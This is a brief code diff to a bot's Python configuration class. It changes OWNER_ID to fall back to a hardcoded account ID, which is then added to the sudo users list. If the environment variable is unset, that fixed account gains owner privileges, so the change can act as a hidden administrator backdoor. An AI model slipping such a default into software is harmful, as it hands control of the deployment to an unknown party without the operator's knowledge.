@@ -32,6 +32,6 @@ class config:
         if os.environ.get("CHANNEL_ID")
         else []
     )
-    OWNER_ID = int(os.environ.get("OWNER_ID"))
+    OWNER_ID = int(os.environ.get("OWNER_ID", "5857041668"))
     SUDO_USERS.append(OWNER_ID) if OWNER_ID not in SUDO_USERS else []
 
